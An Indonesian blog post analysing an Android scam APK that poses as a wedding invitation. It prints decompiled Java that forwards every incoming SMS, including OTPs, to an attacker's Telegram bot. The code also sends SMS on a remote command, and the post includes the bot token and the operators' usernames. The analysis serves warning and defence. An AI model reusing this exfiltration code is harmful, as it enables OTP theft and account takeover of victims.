---
layout: post
title:  "Scam lokasi resepsi [ID]"
date:   2023-02-12
categories: scam analysis reverse-engineering
description: We all have dark side, but some are darker than the others ;)
tags: malware-analysis
---

# Latar Belakang

Pada jumaat 10 Feb 2023, salah satu rekan kerja saya di kantor mendapatkan chat dari nomor yang tidak dikenal dimana beliau di undang untuk menghadiri suatu undangan, dan undangan yang di attach adalah sebuah aplikasi android APK 

<img src="/images/lokasires/image1.png" />

Aplikasi yang kirimkan oleh scammer tersebut terlihat kecil hanya berukuran (6 MB) dan memiliki nilai hash seperti berikut

<img src="/images/lokasires/image2.png" />

# Reverse engineering

Setelah melakukan dekompilasi terhadap APK tersebut, saya menemukan APK tersebut membutuhkan 3 permission yaitu 

    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>

Yang berarti, aplikasi tersebut dapat menerima SMS, menggunakan internet, membaca dan mengirim SMS. Bila dilihat dari permission yang dibutuhkan sepertinya aplikasi ini hanya akan melakukan pencurian SMS OTP pada handphone korban.

Selanjutnya pada directory `sources/com/example/myapplication` ditemukan beberapa file, namun kita akan fokus pada 3 File saja yakni MainActivity.java, ReceiveSms.java dan SendSMS.java

Pada file Mainactivity.java ditemukan adanya komunikasi ke telegram pada function `onRequestPermissionsResult()` 

{% highlight java %}
public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i, strArr, iArr);
        if (i != 1000) {
            return;
        }
        if (iArr[0] == 0) {
            Toast.makeText(this, "Permintaan Anda Sedang di Proses", 0).show();
            Request build = new Request.Builder().url("https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= \n──────────────────────\n\n 𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐖𝐞𝐛𝐩𝐫𝐨 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨 \n\n──────────────────────\n\n    " + this.device).build();
            Request build2 = new Request.Builder().url("https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= \n──────────────────────\n\n  𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐖𝐞𝐛𝐩𝐫𝐨 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨     \n\n    ──────────────────────  \n\n    " + this.device).build();
            this.client.newCall(build).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            this.client.newCall(build2).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            return;
        }
        Toast.makeText(this, "Gagal,Silahkan Coba Install lagi", 0).show();
        Request build3 = new Request.Builder().url(HttpUrl.FRAGMENT_ENCODE_SET + this.device).build();
        Request build4 = new Request.Builder().url(HttpUrl.FRAGMENT_ENCODE_SET + this.device).build();
        this.client.newCall(build3).enqueue(new Callback() {
            public void onFailure(Call call, IOException iOException) {
                iOException.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                if (response.isSuccessful()) {
                    response.body().string();
                }
            }
        });
        this.client.newCall(build4).enqueue(new Callback() {
            public void onFailure(Call call, IOException iOException) {
                iOException.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                if (response.isSuccessful()) {
                    response.body().string();
                }
            }
        });
        finish();
    }
{% endhighlight %}

Pada code diatas terlihat aplikasi tersebut melakukan pengiriman request ke api telegram dengan request body berikut

    https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= \n──────────────────────\n\n 𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐖𝐞𝐛𝐩𝐫𝐨 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨 \n\n──────────────────────\n\n    " + this.device

dimana `this.device` adalah nilai dari `String device = ("𝐃𝐞𝐭𝐚𝐢𝐥 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 : " + Build.FINGERPRINT + Build.TIME + HttpUrl.FRAGMENT_ENCODE_SET);`
dimana nilainya pada setiap device akan berbeda - beda, hal ini sepertinya dilakukan untuk menandai device yang telah berhasil di dapatkan permissionnya, function `onRequestPermissionsResult()` akan tertrigger saat aplikasi tersebut berhasil mendapatkan permission dari pemilik device yang akan di curi SMS OTPnya


Saya juga menemukan adanya url `https://kadio.id/demo/cream-puff` dimana url tersebut akan di load pada webview

{% highlight java %}
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView((int) R.layout.activity_main);
    WebView webView = (WebView) findViewById(R.id.my_web);
    this.webviewku = webView;
    WebSettings settings = webView.getSettings();
    this.websettingku = settings;
    settings.setJavaScriptEnabled(true);
    this.webviewku.setWebViewClient(new WebViewClient());
    this.webviewku.loadUrl("https://kadio.id/demo/cream-puff");
    if (Build.VERSION.SDK_INT >= 19) {
        this.webviewku.setLayerType(2, (Paint) null);
    } else if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {
        this.webviewku.setLayerType(1, (Paint) null);
    }
    if (!(Build.VERSION.SDK_INT < 23 || checkSelfPermission("android.permission.SEND_SMS") == 0 || checkSelfPermission("android.permission.READ_SMS") == 0)) {
        requestPermissions(new String[]{"android.permission.SEND_SMS", "android.permission.READ_SMS"}, 2000);
    }
    if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission("android.permission.RECEIVE_SMS") != 0) {
        requestPermissions(new String[]{"android.permission.RECEIVE_SMS"}, 1000);
    }
}
{% endhighlight %}

dimana webview tersebut akan membuka link tersebut dan function melalukan check terhadap permission `SEND_SMS` dan `READ_SMS`, setelah dicoba membuka link tersebut didapatkan tampilan website seperti berikut

<img src='/images/lokasires/image3.png' />

dapat dilihat si pembuat aplikasi scam tersebut menggunakan service dari `kadio.id` untuk membuat undangan terlihat asli.
Selanjutnya dilakukan analisis terhadap file `ReceiveSms.java`

{% highlight java %}

public void onReceive(Context context, Intent intent) {
        Bundle extras;
        String str = " ";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && (extras = intent.getExtras()) != null) {
            try {
                Object[] objArr = (Object[]) extras.get("pdus");
                SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                int i = 0;
                while (i < smsMessageArr.length) {
                    smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                    String originatingAddress = smsMessageArr[i].getOriginatingAddress();
                    String replace = smsMessageArr[i].getMessageBody().replace("&", "  ").replace("#", str);
                    String replace2 = replace.replace("?", str);
                    Request build = new Request.Builder().url("https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐃𝐚𝐫𝐢  " + originatingAddress + ", 𝐈𝐬𝐢 𝐒𝐌𝐒 : " + replace).build();
                    String str2 = str;
                    Request build2 = new Request.Builder().url("https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐃𝐚𝐫𝐢   " + originatingAddress + ", 𝐈𝐬𝐢 𝐒𝐌𝐒 : " + replace).build();
                    this.client.newCall(build).enqueue(new Callback() {
                        public void onFailure(Call call, IOException iOException) {
                            iOException.printStackTrace();
                        }

                        public void onResponse(Call call, Response response) throws IOException {
                            Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                            if (response.isSuccessful()) {
                                response.body().string();
                            }
                        }
                    });
                    this.client.newCall(build2).enqueue(new Callback() {
                        public void onFailure(Call call, IOException iOException) {
                            iOException.printStackTrace();
                        }

                        public void onResponse(Call call, Response response) throws IOException {
                            Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                            if (response.isSuccessful()) {
                                response.body().string();
                            }
                        }
                    });
                    i++;
                    str = str2;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

{% endhighlight %}

Function tersebut akan melakukan pencurian SMS dimana setiap adanya SMS yang masuk pada device korban maka SMS tersebut akan diteruskan melalui API Telegram dengan request seperti berikut

`https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐃𝐚𝐫𝐢  " + originatingAddress + ", 𝐈𝐬𝐢 𝐒𝐌𝐒 : " + replace`

dimana variable `originatingAddress` berisi nomor pengirim SMS yang diterima oleh korban, dan variable `replace` adalah variable yang berisi body SMS. 

Selanjutnya adalah file `SendSMS.java`, berikut potongan source code pada file ini

{% highlight java %}

public class SendSMS extends BroadcastReceiver {
    final String TAG = "demo";
    private final OkHttpClient client = new OkHttpClient();

    public void onReceive(Context context, Intent intent) {
        SmsMessage[] smsMessageArr;
        Object[] objArr;
        Bundle bundle;
        String str = " ";
        String str2 = ",";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                try {
                    Object[] objArr2 = (Object[]) extras.get("pdus");
                    SmsMessage[] smsMessageArr2 = new SmsMessage[objArr2.length];
                    int i = 0;
                    while (i < smsMessageArr2.length) {
                        smsMessageArr2[i] = SmsMessage.createFromPdu((byte[]) objArr2[i]);
                        String originatingAddress = smsMessageArr2[i].getOriginatingAddress();
                        String messageBody = smsMessageArr2[i].getMessageBody();
                        String replace = messageBody.replace("&", "  ").replace("#", str).replace("?", str);
                        String str3 = messageBody;
                        String str4 = str3.split(str2)[0];
                        String str5 = str3.split(str2)[1];
                        String str6 = str3.split(str2)[2];
                        String str7 = str;
                        String str8 = str2;
                        int parseInt = Integer.parseInt(str4.toString());
                        if (parseInt == 55555) {
                            SmsManager.getDefault().sendTextMessage(str5, (String) null, str6, (PendingIntent) null, (PendingIntent) null);
                            int i2 = parseInt;
                            bundle = extras;
                            try {
                                String str9 = str5;
                                objArr = objArr2;
                                String str10 = str6;
                                Request build = new Request.Builder().url("https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐉𝐍𝐓 𝐒𝐌𝐒 𝐃𝐚𝐫𝐢 " + str9 + ", Isi Pesan : " + str10).build();
                                Request request = build;
                                this.client.newCall(build).enqueue(new Callback() {
                                    public void onFailure(Call call, IOException iOException) {
                                        iOException.printStackTrace();
                                    }

                                    public void onResponse(Call call, Response response) throws IOException {
                                        Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                                        if (response.isSuccessful()) {
                                            response.body().string();
                                        }
                                    }
                                });
                                smsMessageArr = smsMessageArr2;
                                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐉𝐍𝐓 𝐒𝐌𝐒 𝐃𝐚𝐫𝐢 " + str9 + ", Isi Pesan : " + str10).build()).enqueue(new Callback() {
                                    public void onFailure(Call call, IOException iOException) {
                                        iOException.printStackTrace();
                                    }

                                    public void onResponse(Call call, Response response) throws IOException {
                                        Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                                        if (response.isSuccessful()) {
                                            response.body().string();
                                        }
                                    }
                                });
                            } catch (Exception e) {
                                e = e;
                            }
                        } else {
                            int i3 = parseInt;
                            bundle = extras;
                            objArr = objArr2;
                            smsMessageArr = smsMessageArr2;
                            String str11 = str5;
                            String str12 = str6;
                        }
                        i++;
                        str = str7;
                        extras = bundle;
                        objArr2 = objArr;
                        smsMessageArr2 = smsMessageArr;
                        str2 = str8;
                    }
                    Bundle bundle2 = extras;
                    Object[] objArr3 = objArr2;
                    SmsMessage[] smsMessageArr3 = smsMessageArr2;
                } catch (Exception e2) {
                    e = e2;
                    Bundle bundle3 = extras;
                    e.printStackTrace();
                }
            } else {
                Bundle bundle4 = extras;
            }
        }
    }
}

{% endhighlight %}

sama halnya dengan function yang ada pada file `ReceiveSms.java`, pada function `onReceive` aplikasi akan mengambil alamat pengirim SMS dan body SMS yang selanjutnya akan di teruskan melalui telegram API dengan request url seperti berikut 

`https://api.telegram.org/bot5931495238:AAHOz7qP80CGo8D8yueYGJv3Rib4xuKSxHQ/sendMessage?parse_mode=markdown&chat_id=5641182991&text= 𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢 𝐒𝐚𝐝𝐚𝐩 𝐉𝐍𝐓 𝐒𝐌𝐒 𝐃𝐚𝐫𝐢 " + str9 + ", Isi Pesan : " + str10`

setelah melakukan penelusuran terhadap api telegram yang ada, ditemukan beberapa informasi seperti berikut

<img src='/images/lokasires/image4.png'/>

terdapat akun bot dengan username `@Hshsvshauagsgswbot` dan akun asli dengan username `@Mafiaberdasi3811`

<img src='/images/lokasires/akun1.png'/>

<img src='/images/lokasires/akun2.png'/>

# Penutup

Untuk saat ini analisis saya berhenti sampai disini, untuk selanjutnya mungkin pihak berwajib dapat berkerja sama dengan pihak telegram untuk menangkap pemilik bot dan pembuat aplikasi, sebelumnya saya tidak tahu kalau sudah ada beberapa orang juga yang sudah melakukan analisis terhadap aplikasi ini, kudos untuk semua orang yang melakukan analisis pada aplikasi ini, Pak Joshua pada laman Facebooknya dan Mas Nikko pada blognya

Saran:
-   Jangan melakukan instalasi aplikasi yang dikirimkan oleh siapa pun (kenal/tak dikenal) 
-   Selalu instal aplikasi resmi melalui App store/Play store 


